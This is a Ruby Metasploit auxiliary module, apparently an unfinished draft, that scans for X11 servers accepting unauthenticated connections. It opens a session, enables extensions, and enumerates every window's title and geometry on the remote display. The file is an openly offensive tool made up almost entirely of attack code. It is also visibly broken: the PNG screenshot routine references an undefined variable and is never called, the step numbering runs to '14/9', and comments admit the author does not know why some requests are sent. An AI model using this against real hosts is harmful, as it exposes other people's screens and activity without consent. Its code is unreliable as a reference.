##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Exploit::Remote::Tcp
  include Auxiliary::Scanner
  include Auxiliary::Report
  include Exploit::Remote::X11

  def initialize
    super(
      'Name'	=> 'X11 No-Auth Screenshot Scanner',
      'Description'	=> %q{
        This module scans for X11 servers that allow anyone
        to connect without authentication. It can optionally take
        a screenshot as well.
      },
      'Author'	=> [
        'h00die'
      ],
      'References' => [
        ['OSVDB', '309'],
        ['CVE', '1999-0526'],
      ],
      'License'	=> MSF_LICENSE,
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [],
        'Reliability' => [],
        'RelatedModules' => [
          'auxiliary/gather/x11_keyboard_spy',
        ]
      }
    )

    register_options([
      Opt::RPORT(6000),
    ])
  end

  def process_extension_query(packet, extension)
    begin
      extension_response = QUERYEXTENSIONRESPONSE.read(packet)
    rescue ::EOFError
      packet += sock
      fail_with(Msf::Module::Failure::UnexpectedReply, "Unable to process QueryExtension Response. Raw packet: #{packet}")
    end

    if extension_response.present == 1
      print_good("  Extension #{extension} is present with id #{extension_response.major_opcode}")
    else
      fail_with(Msf::Module::Failure::UnexpectedReply, "Extension #{extension} is NOT present (#{packet.inspect})")
    end
    extension_response
  end

  def convert_zpixmap_to_png(_zpixmap)
    # Assume zpixmap_data is your array representing ZPixmap data
    # You need to know the width, height, and color depth of the image
    width = 100
    height = 100
    color_depth = 8 # 8-bit color depth for example

    # Open a file for writing in binary mode
    File.open('output.png', 'wb') do |file|
      # PNG signature
      file.write("\x89PNG\r\n\x1A\n".force_encoding('ASCII-8BIT'))

      # IHDR chunk - Image Header
      ihdr_data = [width, height, color_depth, 2, 0, 0, 0].pack('NNCCCCC')
      file.write([ihdr_data.length, 'IHDR', ihdr_data, Zlib.crc32('IHDR' + ihdr_data)].pack('NA4A*N'))

      # IDAT chunk - Image Data
      idat_data = zpixmap_data.pack('C*')
      file.write([idat_data.length, 'IDAT', idat_data, Zlib.crc32('IDAT' + idat_data)].pack('NA4A*N'))

      # IEND chunk - End of Image
      file.write([0, 'IEND', '', Zlib.crc32('IEND')].pack('NA4A*N'))
    end
  end

  def has_children?(event_mask)
    event_mask == 0 || event_mask == 256 || event_mask == 65536
  end

  def take_screenshot(connection)
    query_extension_calls = 0

    # query extension big-requests
    vprint_status('(2/9) Checking on BIG-REQUESTS extension')
    sock.put(QUERYEXTENSION.new(extension: 'BIG-REQUESTS', unused2: query_extension_calls).to_binary_s) # check if BIG-REQUESTS exist, not sure why
    query_extension_calls += 1
    big_requests_plugin = process_extension_query(sock.get_once(-1, 1), 'BIG-REQUESTS')

    # enable big requests
    vprint_status('(3/9) Enabling BIG-REQUESTS')
    sock.put(EXTENSIONTOGGLE.new(opcode: big_requests_plugin.major_opcode).to_binary_s) # not sure why we do this
    sock.get_once(-1, 1)

    # createGC, GetProperties
    vprint_status('(4/9) Creating new graphical context')
    sock.put(X11CREATEGRAPHICALCONTEXTREQUEST.new(cid: connection.resource_id_base,
                                                  drawable: connection.screen_root,
                                                  gc_value_mask_background: 1).to_binary_s +
             X11GETPROPERTYREQUEST.new(window: connection.screen_root).to_binary_s) # not sure why we do this
    sock.get_once(-1, 1)

    # query extension xkeyboard
    vprint_status('(5/9) Checking on XKEYBOARD extension')
    sock.put(QUERYEXTENSION.new(extension: 'XKEYBOARD', unused2: query_extension_calls).to_binary_s) # check if XKEYBOARD exist, not sure why
    xkeyboard_plugin = process_extension_query(sock.get_once(-1, 1), 'XKEYBOARD')
    query_extension_calls += 1

    # enable xkeyboard
    vprint_status('(6/9) Enabling XKEYBOARD')
    sock.put(EXTENSIONTOGGLE.new(opcode: xkeyboard_plugin.major_opcode, wanted_major: 1).to_binary_s) # use keyboard
    sock.get_once(-1, 1)

    # InternAtom wait
    vprint_status('(7/9) Setting wait on itern atom')
    sock.put(X11INTERNATOMREQUEST.new(name: 'Wait').to_binary_s)
    sock.get_once(-1, 1)

    vprint_status('(7.5/9) Getting window title atoms')
    sock.put(X11INTERNATOMREQUEST.new(name: '_NET_WM_NAME').to_binary_s +
            X11INTERNATOMREQUEST.new(name: "UTF8_STRING\x00").to_binary_s)
    atom_reply = sock.get_once(-1, 1)
    @window_name_atom = X11INTERNATOMRESPONSE.read(atom_reply[0..atom_reply.length/2])
    @window_name_atom = @window_name_atom.atom 
    @window_string_atom = X11INTERNATOMRESPONSE.read(atom_reply[atom_reply.length/2..-1])
    @window_string_atom = @window_string_atom.atom 
    vprint_good("  Using UTF8 windows names via atoms [#{@window_name_atom},#{@window_string_atom}]")
    # xkeyboard-bell
    vprint_status('(8/9) Setting xkeyboard bell')
    sock.put(BELLREQUEST.new(xkeyboard_id: xkeyboard_plugin.major_opcode).to_binary_s)
    # sock.get_once(-1, 1)

    # getwindowattributes+getgeometry
    # XXX this is getting a response of "Unkonwn request"
    query_extension_calls += 1 # XXX not sure why, figure out where we're missing a call
    vprint_status('(9/9) Getting root Window Attributes')
    sock.put(GETREQUEST.new(window: connection.screen_root,
                            opcode: 3, # GetWindowAttributes
                            unused: query_extension_calls).to_binary_s +
            GETREQUEST.new(
              window: connection.screen_root,
              opcode: 14, # GetGeometry
              unused: query_extension_calls + 1
            ).to_binary_s) # not sure why we do this
    sock.get_once(-1, 1)

    # translatecoordinates
    vprint_status('(10/9) Getting coordinates translation')
    sock.put(TRANSLATECOORDINATESREQUEST.new(src_window: connection.screen_root, dst_window: connection.screen_root).to_binary_s)
    sock.get_once(-1, 1)

    # getproperty
    vprint_status('(11/9) ')
    sock.put(X11GETPROPERTYREQUEST.new(window: connection.screen_root).to_binary_s)
    sock.get_once(-1, 1)

    # InternAtom server_overlay_visuals
    vprint_status('(12/9) Setting Server Overlay Visuals on Itern Atom')
    sock.put(X11INTERNATOMREQUEST.new(name: "SERVER_OVERLAY_VISUALS\x00\x00",
                                      only_if_exists: 1).to_binary_s)
    sock.get_once(-1, 1)

    # getwindowattributes+getgeometry
    vprint_status('(13/9) Getting window attributes and geometry')
    sock.put(GETREQUEST.new(window: connection.screen_root,
                            opcode: 3,
                            unused: 3).to_binary_s +
              GETREQUEST.new(opcode: 14,
                             window: connection.screen_root).to_binary_s)
    sock.get_once(-1, 1)

    # querytree
    vprint_status('(14/9) Getting Tree')
    tree = get_process_tree(connection.screen_root,'')
    puts "and now were done, heres the final tree"
    puts tree
  end

  def get_process_tree(window, spaces)
    vprint_status("#{spaces}  Getting children for window #{window}")
    tree = {}
    sock.put(QUERYTREEREQUEST.new(drawable: window).to_binary_s)

    response = sock.get_once(-1, 1)
    attempts_to_read_data = 0
    trees = nil
    while attempts_to_read_data < 3 && trees.nil?
      begin
        trees = QUERYTREERESPONSE.read(response)
      rescue StandardError => e
        vprint_bad("Failed to parse data, attempt #{attempts_to_read_data}/3 to get more")
      end
      tmp_data  = sock.get_once(-1, 1)
      response << tmp_data unless tmp_data.nil?
      attempts_to_read_data +=1
    end
    vprint_status("  #{spaces}Found #{trees.children.length} child windows")

    # getwindowattributes+getgeometry
    # vprint_status('(15/9) Getting window attributes and geometry for each tree')
    #puts trees.inspect
    trees.children.each_with_index do |child_window, i|
      #next if t == connection.screen_root # no need to hit the root
      next if child_window < 5_000 # arbitrary value i'm seeing, most invalid windows are like 0-1500, however valid ones are in the millions
      #puts "Attemping to get data for child_window: #{child_window}"
      # getwindowattributes+getgeometry
      sock.put(GETREQUEST.new(window: child_window,
                              opcode: 3,
                              unused: 3).to_binary_s +
              GETREQUEST.new(window: child_window,
                opcode: 14).to_binary_s +
              X11GETPROPERTYREQUEST.new(window: child_window,
                property: @window_name_atom,
                get_property_type: @window_string_atom).to_binary_s)

      response = sock.get_once(-1, 1)
      attempts_to_read_data = 0
      window_attributes = nil
      window_geometry = nil
      window_name = nil
      while attempts_to_read_data < 3 && (window_attributes.nil? || window_geometry.nil? || window_name.nil?)
        begin
          window_attributes = GETWINDOWRESPONSE.read(response[0..44])
          window_geometry = WINDOWATTRIBUTESGETGEOMETRYRESPONSE.read(response[44..76])
          window_name = X11GETPROPERTYRESPONSE.read(response[76..-1])
        rescue StandardError
          vprint_bad("Failed to parse data, attempt #{attempts_to_read_data}/3 to get more")
        end
        tmp_data  = sock.get_once(-1, 1)
        response << tmp_data unless tmp_data.nil?
        attempts_to_read_data +=1
      end

      if window_attributes.nil? || window_geometry.nil? || window_name.nil?
        print_bad("Error reading data")
      end
    

      # if window_geometry.width == connection.screen_width_in_pixels && window_geometry.height == connection.screen_height_in_pixels
      # if t.to_i.to_s(16) == '2800003' || t.to_i.to_s(16) == '260000a' || t.to_i.to_s(16) == '406913' || t.to_i.to_s(16) == '407896'
      if window_attributes.your_event_mask == 0 || window_attributes.your_event_mask == 256 || window_attributes.your_event_mask == 65536
        vprint_status("#{spaces}#{i}/#{trees.children_len} Window: 0x#{child_window.to_i.to_s(16)} (#{window_name.value_data}) #{window_geometry.width}x#{window_geometry.height}+#{window_geometry.x}+#{window_geometry.y}")
      else
        print_good("#{spaces}#{i}/#{trees.children_len} Window: 0x#{child_window.to_i.to_s(16)} (#{window_name.value_data}) #{window_geometry.width}x#{window_geometry.height}+#{window_geometry.x}+#{window_geometry.y}")
        #puts "  #{spaces}#{window_attributes.inspect}"
        #puts "  #{spaces}#{window_geometry.inspect}"
        next if child_window == window # dont recurse yourself
        tree[child_window.to_i] = get_process_tree(child_window, "  #{spaces}")
        #puts tree.inspect
      end
    end
    tree
  end

  def run_host(ip)
    vprint_status('Establishing TCP Connection')
    connect # tcp connection establish
    vprint_status('(1/9) Establishing X11 connection')
    sock.put(X11CONNECTIONREQUEST.new.to_binary_s) # x11 session establish
    packet = sock.get_once(-1, 1)
    begin
      connection = X11CONNECTION.read(packet)
    rescue EOFError
      vprint_bad("Connection packet malformed (size: #{packet.length}), attempting to get read more data")
      packet += sock.get_once(-1, 1)
    end

    begin
      connection = X11CONNECTION.read(packet)
    rescue StandardError
      vprint_bad('Failed to parse X11 connection initialization response packet')
      return
    end

    if connection.success == 1
      print_good("#{ip} - Successly established X11 connection")
      #puts connection.inspect
      vprint_status("  Vendor: #{connection.vendor}")
      vprint_status("  Version: #{connection.protocol_version_major}.#{connection.protocol_version_minor}")
      vprint_status("  Screen Resolution: #{connection.screen_width_in_pixels}x#{connection.screen_height_in_pixels}")
      vprint_status("  Resource ID: #{connection.resource_id_base.inspect}")
      vprint_status("  Screen root: #{connection.screen_root.inspect}")
      report_note(
        host: ip,
        proto: 'tcp',
        sname: 'x11',
        port: rport,
        type: 'x11.server_vendor',
        data: "Open X Server (#{connection.vendor})"
      )

      take_screenshot(connection)
    else
      vprint_error("#{ip} Access Denied")
    end
    disconnect
  end
end
